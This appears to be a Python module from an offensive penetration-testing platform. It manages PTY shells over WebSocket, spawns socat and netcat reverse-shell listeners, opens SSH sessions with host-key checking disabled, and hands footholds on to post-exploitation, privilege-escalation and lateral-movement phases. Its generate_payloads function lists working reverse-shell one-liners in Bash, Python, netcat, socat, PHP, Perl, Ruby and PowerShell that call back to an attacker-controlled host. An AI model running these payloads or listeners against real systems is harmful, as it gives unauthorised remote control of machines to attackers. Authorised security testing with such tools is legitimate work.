"""
KALI PENTEST PLATFORM v2 — Shell Agent
PTY process management. Routes I/O through WebSocket.

WS protocol:
  C→S: { type:"shell_input",  shell_id, data }
  C→S: { type:"shell_resize", shell_id, cols, rows }
  S→C: { type:"shell_output", shell_id, data }
  S→C: { type:"shell_status", shell_id, active, info }
"""

import asyncio, fcntl, os, pty, signal, struct, termios, time
from typing import Optional, Dict, List, Callable, Awaitable, Any
from datetime import datetime
import netifaces

from agents.base_agent import BaseAgent, BroadcastFn
from db.schemas import AgentName, AgentStatus, AttackPhase, WebSocketMessage
import db.mongo_client as db

OutputCallback = Callable[[str, str], Awaitable[None]]


class PtyShell:
    """PTY subprocess wrapper with async I/O."""

    def __init__(self, shell_id: str, on_output: OutputCallback):
        self.shell_id = shell_id
        self.on_output = on_output
        self.pid: Optional[int] = None
        self.master: Optional[int] = None
        self.active = False
        self._reader_task: Optional[asyncio.Task] = None
        self._cmd_history: List[Dict] = []
        self._buf = ""

    async def spawn(self, argv: List[str], cwd: str = "/tmp") -> bool:
        try:
            self.pid, self.master = pty.fork()
        except Exception as e:
            print(f"[PTY] fork failed: {e}")
            return False
        if self.pid == 0:
            try:
                os.chdir(cwd)
                os.execvp(argv[0], argv)
            except Exception:
                os._exit(1)
        else:
            self._set_winsize(220, 50)
            fl = fcntl.fcntl(self.master, fcntl.F_GETFL)
            fcntl.fcntl(self.master, fcntl.F_SETFL, fl | os.O_NONBLOCK)
            self.active = True
            self._reader_task = asyncio.create_task(self._read_loop())
        return True

    def _set_winsize(self, cols: int, rows: int):
        if self.master is None:
            return
        try:
            fcntl.ioctl(self.master, termios.TIOCSWINSZ,
                        struct.pack("HHHH", rows, cols, 0, 0))
        except Exception:
            pass

    async def resize(self, cols: int, rows: int):
        self._set_winsize(cols, rows)

    async def write(self, data: str):
        if not self.active or self.master is None:
            return
        try:
            os.write(self.master, data.encode("utf-8", errors="replace"))
            self._buf += data
            if "\r" in data or "\n" in data:
                cmd = self._buf.replace("\r", "").replace("\n", "").strip()
                if cmd:
                    self._cmd_history.append({
                        "cmd": cmd, "output": "", "ts": datetime.utcnow().isoformat()
                    })
                self._buf = ""
        except OSError:
            await self._on_close()

    async def _read_loop(self):
        loop = asyncio.get_event_loop()
        while self.active:
            try:
                data = await loop.run_in_executor(None, self._safe_read)
                if data is None:
                    await asyncio.sleep(0.01)
                    continue
                if data == b"":
                    await self._on_close()
                    break
                text = data.decode("utf-8", errors="replace")
                if self._cmd_history:
                    self._cmd_history[-1]["output"] += text
                await self.on_output(self.shell_id, text)
            except asyncio.CancelledError:
                break
            except Exception as e:
                if self.active:
                    print(f"[PTY] read err {self.shell_id}: {e}")
                await asyncio.sleep(0.05)

    def _safe_read(self) -> Optional[bytes]:
        if not self.active or self.master is None:
            return None
        try:
            return os.read(self.master, 4096)
        except BlockingIOError:
            return None
        except OSError:
            return b""

    async def _on_close(self):
        self.active = False
        if self.pid:
            try:
                os.waitpid(self.pid, os.WNOHANG)
            except Exception:
                pass
        await self.on_output(
            self.shell_id,
            "\r\n\x1b[31m[Shell session closed]\x1b[0m\r\n"
        )

    def terminate(self):
        self.active = False
        if self._reader_task:
            self._reader_task.cancel()
        if self.pid:
            try:
                os.kill(self.pid, signal.SIGTERM)
                time.sleep(0.1)
                os.kill(self.pid, signal.SIGKILL)
            except ProcessLookupError:
                pass
        if self.master is not None:
            try:
                os.close(self.master)
            except Exception:
                pass
            self.master = None

    @property
    def command_history(self) -> List[Dict]:
        return self._cmd_history


class ShellAgent(BaseAgent):
    """Manages a pool of PTY shells, routes I/O via WS broadcast."""

    def __init__(self, broadcast: Optional[BroadcastFn] = None):
        super().__init__(AgentName.SHELL, broadcast)
        self.phase = AttackPhase.POST_EXPLOIT
        self._shells: Dict[str, PtyShell] = {}
        # Recommendation A — ShellAgent gets a back-reference to MasterAgent
        # so manual-capture paths (create_listener, connect_ssh) can flow
        # through register_shell and trip post-ex / privesc / lateral.
        # MasterAgent assigns this when it instantiates / receives a
        # ShellAgent reference (currently set in API layer); a None
        # _master means standalone use and the registration is skipped.
        self._master: Optional[Any] = None

    async def run(self, session_id: str, target: str, **kwargs) -> Dict:
        self._session_id = session_id
        await self.set_status(AgentStatus.IDLE, "Shell agent ready")
        return {"status": "ready"}

    # ── Shell lifecycle ──────────────────────────────────────────

    async def create_listener(
        self, session_id: str, shell_id: str, shell_type: str,
        lport: int, lhost: Optional[str] = None,
        rhost: str = "0.0.0.0", protocol: str = "tcp"
    ) -> Dict:
        """Start a PTY-backed reverse shell listener."""
        self._session_id = session_id
        lhost = lhost or self._get_lhost()

        if shell_type in ("reverse_shell", "socat"):
            argv = [
                "socat",
                f"TCP-LISTEN:{lport},reuseaddr,fork",
                "EXEC:/bin/bash -li,pty,stderr,setsid,sigint,sane",
            ]
            display_cmd = f"socat TCP-LISTEN:{lport},reuseaddr,fork EXEC:/bin/bash,pty,..."
        else:
            argv = ["nc", "-lvnp", str(lport)]
            display_cmd = f"nc -lvnp {lport}"

        pty_shell = PtyShell(shell_id, self._on_pty_output)
        success = await pty_shell.spawn(argv)
        if success:
            self._shells[shell_id] = pty_shell
            await db.update_shell_session(shell_id, {
                "active": True, "pid": pty_shell.pid, "lhost": lhost
            })
            await self.set_status(AgentStatus.RUNNING, f"Listener :{lport}")
            await self._emit("shell_status", {
                "shell_id": shell_id, "active": True,
                "info": {"pid": pty_shell.pid, "port": lport, "lhost": lhost}
            })
            # Listener spawn is OPTIMISTIC — we have no callback yet, so
            # post-ex / privesc / lateral must NOT fire on this call.  When
            # the callback actually arrives, ListenerManager.wait_for_session
            # calls register_shell with confirmed=True + real `uid=`/prompt
            # evidence and that's what flips shell_access.
            if self._master is not None:
                try:
                    await self._master.register_shell(
                        source     = "shell_agent:listener",
                        user       = "unknown",
                        host       = rhost or "",
                        method     = f"reverse_shell:{shell_type}",
                        evidence   = display_cmd,
                        session_id = shell_id,
                        rhost      = rhost,
                        rport      = lport,
                        confirmed  = False,
                    )
                except Exception:
                    pass
            return {"success": True, "shell_id": shell_id, "pid": pty_shell.pid,
                    "command": display_cmd, "lhost": lhost, "lport": lport}
        return {"success": False, "error": "PTY spawn failed"}

    async def connect_ssh(
        self, session_id: str, shell_id: str, host: str, port: int,
        username: str, password: Optional[str] = None, key_file: Optional[str] = None
    ) -> Dict:
        """Open SSH session as interactive PTY."""
        self._session_id = session_id
        if password:
            argv = ["sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no",
                    "-p", str(port), f"{username}@{host}"]
        elif key_file:
            argv = ["ssh", "-o", "StrictHostKeyChecking=no", "-i", key_file,
                    "-p", str(port), f"{username}@{host}"]
        else:
            argv = ["ssh", "-o", "StrictHostKeyChecking=no",
                    "-p", str(port), f"{username}@{host}"]

        pty_shell = PtyShell(shell_id, self._on_pty_output)
        success = await pty_shell.spawn(argv)
        if success:
            self._shells[shell_id] = pty_shell
            await db.update_shell_session(shell_id, {
                "active": True, "pid": pty_shell.pid, "shell_user": username
            })
            await self._emit("shell_status", {
                "shell_id": shell_id, "active": True, "info": {"host": host, "user": username}
            })
            # Recommendation A — SSH-in is a foothold the post-ex / privesc
            # / lateral phases must see.  Skipped silently when no master
            # back-reference is set (standalone API-only use).
            if self._master is not None:
                try:
                    await self._master.register_shell(
                        source     = "shell_agent:ssh",
                        user       = username or "unknown",
                        host       = host,
                        method     = "ssh",
                        evidence   = f"SSH session as {username}@{host}:{port}",
                        session_id = shell_id,
                        rhost      = host,
                        rport      = port,
                    )
                except Exception:
                    pass
            return {"success": True, "shell_id": shell_id, "pid": pty_shell.pid}
        return {"success": False, "error": "SSH spawn failed"}

    # ── Real-time I/O ────────────────────────────────────────────

    async def handle_input(self, shell_id: str, data: str):
        """Route WS shell_input → PTY stdin."""
        shell = self._shells.get(shell_id)
        if shell and shell.active:
            await shell.write(data)
        elif self.broadcast and self._session_id:
            msg = WebSocketMessage(
                type="shell_output", session_id=self._session_id, agent=self.name,
                data={"shell_id": shell_id, "data": "\r\n\x1b[31m[Not connected]\x1b[0m\r\n"}
            )
            await self.broadcast(msg)

    async def resize_shell(self, shell_id: str, cols: int, rows: int):
        s = self._shells.get(shell_id)
        if s:
            await s.resize(cols, rows)

    async def upgrade_shell(self, shell_id: str) -> str:
        """Send TTY stabilisation commands."""
        s = self._shells.get(shell_id)
        if not s:
            return "Shell not found"
        for cmd in [
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\r",
            "export TERM=xterm-256color\r",
            "stty rows 50 cols 220\r",
        ]:
            await s.write(cmd)
            await asyncio.sleep(0.3)
        return "Upgrade commands sent"

    async def terminate_shell(self, shell_id: str):
        s = self._shells.pop(shell_id, None)
        if s:
            s.terminate()
        await db.update_shell_session(shell_id, {
            "active": False, "closed_at": datetime.utcnow()
        })
        await self._emit("shell_status", {"shell_id": shell_id, "active": False, "info": {}})

    def get_shell_history(self, shell_id: str) -> List[Dict]:
        s = self._shells.get(shell_id)
        return s.command_history if s else []

    # ── Internal ─────────────────────────────────────────────────

    async def _on_pty_output(self, shell_id: str, data: str):
        if self.broadcast and self._session_id:
            msg = WebSocketMessage(
                type="shell_output", session_id=self._session_id, agent=self.name,
                data={"shell_id": shell_id, "data": data}
            )
            try:
                await self.broadcast(msg)
            except Exception as e:
                print(f"[SHELL] broadcast err: {e}")

    def _get_lhost(self) -> str:
        try:
            for iface in netifaces.interfaces():
                if iface == "lo":
                    continue
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    ip = addrs[netifaces.AF_INET][0].get("addr", "")
                    if ip and not ip.startswith("127."):
                        return ip
        except Exception:
            pass
        return "127.0.0.1"

    @staticmethod
    def generate_payloads(lhost: str, lport: int) -> List[Dict]:
        return [
            {"label": "Bash TCP",
             "cmd": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"},
            {"label": "Python3",
             "cmd": (f"python3 -c \'import socket,subprocess,os;"
                     f"s=socket.socket();s.connect((\"\"{lhost}\"\",{lport}));"
                     "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                     "os.dup2(s.fileno(),2);"
                     "subprocess.call([\"\"/bin/sh\"\",\"\"-i\"\"])\'")},
            {"label": "Netcat mkfifo",
             "cmd": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"},
            {"label": "Socat PTY",
             "cmd": f"socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"},
            {"label": "PHP",
             "cmd": f"php -r \'$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");\'"},
            {"label": "Perl",
             "cmd": (f"perl -e \'use Socket;$i=\"{lhost}\";$p={lport};"
                     "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                     "if(connect(S,sockaddr_in($p,inet_aton($i))))"
                     "{open(STDIN,\">&S\");open(STDOUT,\">&S\");"
                     "open(STDERR,\">&S\");exec(\"/bin/sh -i\");}\'")},
            {"label": "Ruby",
             "cmd": (f"ruby -rsocket -e\'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;"
                     "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)\'")},
            {"label": "PowerShell",
             "cmd": (f"$c=New-Object Net.Sockets.TCPClient(\"{lhost}\",{lport});"
                     "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
                     "while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
                     "{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
                     "$r=(iex $d 2>&1|Out-String);"
                     "$rb=([Text.Encoding]::ASCII).GetBytes($r+\"PS> \");"
                     "$s.Write($rb,0,$rb.Length)}")},
        ]
